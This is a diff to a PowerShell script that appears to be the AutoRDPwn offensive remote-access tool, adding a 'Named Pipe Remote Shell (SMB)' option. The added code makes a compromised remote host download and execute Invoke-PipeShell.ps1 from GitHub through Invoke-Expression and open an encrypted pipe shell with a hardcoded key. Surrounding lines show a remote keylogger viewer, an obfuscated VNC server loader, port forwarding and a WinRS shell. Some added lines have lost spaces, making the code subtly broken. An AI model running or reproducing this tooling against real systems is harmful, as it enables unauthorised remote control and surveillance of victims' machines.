@@ -281,27 +281,30 @@ function Remove-Exclusions {
         $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine()
 
         if($module -like '1') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt39" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt51" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt52" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $shell = $Host.UI.ReadLine() ; Write-Host
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] -$txt39" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Named Pipe Remote Shell (SMB)" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] -$txt51" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] -$txt52" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] -$txt22" -ForegroundColor Gray
+        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] -$txt2" -ForegroundColor Gray
+        Write-Host ;$Random = New-Object System.Random ;$txt8 -split '' | ForEach-Object{Write-Host$_ -nonew ; Start-Sleep -milliseconds$(1 +$Random.Next(25))}
+        $Host.UI.RawUI.ForegroundColor = 'Green' ;$shell =$Host.UI.ReadLine() ; Write-Host
 
-        if($shell -like '1'){ $console = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
+        if($shell -like '1'){$console = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
+
+        if($shell -like '2'){$smbshell = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
         
-        if($shell -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
-        Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
-        Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'local' ; Start-Sleep -milliseconds 2000 }
-
         if($shell -like '3'){ Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
-        Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
-        Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; Write-Host
-        Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'remote' ; Start-Sleep -milliseconds 2000 }
+        Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ;$ncport =$Host.UI.ReadLine() ; Write-Host
+        Write-Host "$txt46" -ForegroundColor Green ;$netcat = 'local' ; Start-Sleep -milliseconds 2000 }
 
-        if($shell -like 'X'){ $input = 'x' ; continue }
-        if($shell -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
+        if($shell -like '4'){ Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 ; Write-Host
+        Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ;$ncport =$Host.UI.ReadLine() ; Write-Host
+        Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ;$ipadress =$Host.UI.ReadLine() ; Write-Host
+        Write-Host "$txt46" -ForegroundColor Green ;$netcat = 'remote' ; Start-Sleep -milliseconds 2000 }
+
+        if($shell -like 'X'){$input = 'x' ; continue }
+        if($shell -in '1','2','3','4','m') {$null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
 
         if($module -like '2') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt9" -ForegroundColor Gray
@@ -554,6 +557,10 @@ function Remove-Exclusions {
     Write-Host ; Write-Host "$txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray ;  if($hash) { cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null }
     $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
+    if($smbshell){ invoke-command -session$RDP[0] -scriptblock { Start-Job -ScriptBlock { 
+    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
+    Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe "Shared Folder" 2>&1>$null }}}
+
     if($vncserver){ $base64 = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')
     invoke-command -session $RDP[0] -scriptblock { $base64array = ($using:base64).ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null
     $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"))
@@ -640,6 +647,9 @@ Write-Host "--------------------------------------------------------------------
 Write-Host "              Remote Keylogger " -NoNewLine -ForegroundColor Green ; Write-Host "| " -NoNewLine -ForegroundColor Gray ; Write-Host "Press 'Ctrl+C' to stop              " -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
 try { while($true) { Get-Content -wait $env:localappdata\config.dat }} finally { Write-Host ; Write-Host "Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}}
+
+if ($smbshell){ Write-Host; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
+Invoke-PipeShell -mode client -server$computer -aeskey AutoRDPwn_AESKey -i -pipe "Shared Folder" -timeout 120 }
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
